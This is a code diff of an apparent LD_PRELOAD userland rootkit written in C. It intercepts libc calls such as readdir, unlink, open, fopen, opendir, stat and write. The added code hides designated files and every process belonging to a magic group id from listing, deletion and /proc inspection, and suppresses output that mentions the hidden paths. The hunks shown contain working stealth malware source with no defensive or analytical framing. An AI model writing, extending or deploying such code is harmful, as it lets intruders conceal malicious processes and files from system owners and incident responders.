@@ -10,32 +10,10 @@
 #include <sys/types.h>
 #include <fcntl.h>
 #include <pcap.h>
-
-// for internal use
-
-struct dirent *(*__o_readdir)(DIR *);
-struct dirent *__readdir(DIR *p) {
-#ifdef VERBOSE
-    printf("readdir called\n");
-#endif
-    if(!__o_readdir)
-        __o_readdir = dlsym(RTLD_NEXT, "readdir");
-
-    return __o_readdir(p);
-}
-
-// for internal use
-
-DIR *(*__o_opendir)(const char *);
-DIR *__opendir(const char *name) {
-#ifdef VERBOSE
-    printf("opendir called\n");
-#endif
-    if(!__o_opendir)
-        __o_opendir = dlsym(RTLD_NEXT, "opendir");
-
-    return __o_opendir(name);
-}
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <pthread.h>
+#include <sys/ptrace.h>
 
 int good_gid() {
     gid_t gid = getgid();
@@ -122,6 +100,14 @@ struct dirent *readdir(DIR *p) {
         return readdir(p);
     }
 
+    int pid = atoi(dir->d_name);
+    if (pid != 0) {
+        int gid = pid_to_gid(pid);
+        if (gid == GID) {
+            return readdir(p);
+        }
+    }
+
     return dir;
 }
 
@@ -144,8 +130,18 @@ struct dirent64 *readdir64(DIR *p) {
         return NULL;
     }
 
-    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0) {
+    if (strcmp(dir->d_name, HIDDEN_FILENAME) == 0 
+    || strcmp(dir->d_name, HIDDEN_FILENAME2) == 0
+    ) {
         return readdir64(p);
+    }
+
+    int pid = atoi(dir->d_name);
+    if (pid != 0) {
+        int gid = pid_to_gid(pid);
+        if (gid == GID) {
+            return readdir64(p);
+        }
     }
 
     return dir;
@@ -173,6 +169,14 @@ int unlink(const char *pathname) {
         return 0;
     }
 
+    int pid = atoi(pathname);
+    if (pid != 0) {
+        int gid = pid_to_gid(pid);
+        if (gid == GID) {
+            return -1;
+        }
+    }
+
     return o_unlink(pathname);
 }
 
@@ -198,6 +202,14 @@ int unlinkat(int dirfd, const char * pathname, int flags) {
         return 0;
     }
 
+    int pid = atoi(pathname);
+    if (pid != 0) {
+        int gid = pid_to_gid(pid);
+        if (gid == GID) {
+            return -1;
+        }
+    }
+
     return o_unlinkat(dirfd, pathname, flags);
 }
 
@@ -214,23 +226,14 @@ ssize_t write(int fd, const void *xbuf, size_t count) {
         return o_write(fd, xbuf, count);
     }
 
-    if (fd == 1) {
-        char *buf = (char *) xbuf;
-        if (
-            strstr(buf, HIDDEN_FILENAME) != NULL 
-        || strstr(buf, HIDDEN_FILENAME2) != NULL
-        || strstr(buf, HIDDEN_EXEC_PATH) != NULL
-        || strstr(buf, HIDDEN_PATH) != NULL
-        ) {
-            return count;
-        }
-    }
-
-    if (fd == 3) {
-        // save it to a log file
-        // TODO
-        printf("write to log file\n");
-        printf("%s\n", (char *) xbuf	);
+    char *buf = (char *) xbuf;
+    if (
+        strstr(buf, HIDDEN_FILENAME) != NULL 
+    || strstr(buf, HIDDEN_FILENAME2) != NULL
+    || strstr(buf, HIDDEN_EXEC_PATH) != NULL
+    || strstr(buf, HIDDEN_PATH) != NULL
+    ) {
+        return count;
     }
 
     return o_write(fd, xbuf, count);
@@ -264,27 +267,6 @@ ssize_t read(int fd, void *xbuf, size_t count) {
     return o_read(fd, xbuf, count);
 }
 
-int (*o_kill)(pid_t, int);
-int kill(pid_t pid, int sig) {
-#ifdef VERBOSE
-    printf("kill called\n");
-#endif
-    if(!o_kill)
-        o_kill = dlsym(RTLD_NEXT, "kill");
-
-    if (good_gid() == 1) {
-        return o_kill(pid, sig);
-    }
-
-    int gid = pid_to_gid(pid);
-
-    if (gid == GID) {
-        return -1;
-    }
-
-    return o_kill(pid, sig);
-}
-
 // openat
 
 int (*o_openat)(int, const char *, int, ...);
@@ -292,6 +274,8 @@ int openat(int dirfd, const char *path, int flags, ...) {
 #ifdef VERBOSE
     printf("openat called\n");
 #endif
+    printf("openat called\n");
+
     if(!o_openat)
         o_openat = dlsym(RTLD_NEXT, "openat");
 
@@ -304,11 +288,9 @@ int openat(int dirfd, const char *path, int flags, ...) {
         return -1;
     }
 
-    if (strstr(path, "/proc/") != NULL) {
-        // if the file is in /proc/ check if the gid is the same as the one we want to hide
-        int pid = atoi(path + 6);
+    int pid = atoi(path);
+    if (pid != 0) {
         int gid = pid_to_gid(pid);
-
         if (gid == GID) {
             return -1;
         }
@@ -335,10 +317,9 @@ int open64(const char *path, int flags, ...) {
         return -1;
     }
 
-    if (strstr(path, "/proc/") != NULL) {
-        int pid = atoi(path + 6);
+    int pid = atoi(path);
+    if (pid != 0) {
         int gid = pid_to_gid(pid);
-
         if (gid == GID) {
             return -1;
         }
@@ -365,6 +346,14 @@ FILE *fopen(const char *path, const char *mode) {
         return NULL;
     }
 
+    int pid = atoi(path);
+    if (pid != 0) {
+        int gid = pid_to_gid(pid);
+        if (gid == GID) {
+            return NULL;
+        }
+    }
+
     return o_fopen(path, mode);
 }
 
@@ -386,15 +375,9 @@ DIR *opendir(const char *name) {
         return NULL;
     }
 
-    // get name of current directory using getcwd
-    char cwd[1024];
-    getcwd(cwd, sizeof(cwd));
-
-    // check if the directory is in /proc/
-    if (strstr(cwd, "/proc/") != NULL) {
-        int pid = atoi(cwd + 6);
+    int pid = atoi(name);
+    if (pid != 0) {
         int gid = pid_to_gid(pid);
-
         if (gid == GID) {
             return NULL;
         }
@@ -421,10 +404,9 @@ int stat(const char *pathname, struct stat *statbuf) {
         return -1;
     }
 
-    if (strstr(pathname, "/proc/") != NULL) {
-        int pid = atoi(pathname + 6);
+    int pid = atoi(pathname);
+    if (pid != 0) {
         int gid = pid_to_gid(pid);
-
         if (gid == GID) {
             return -1;
         }
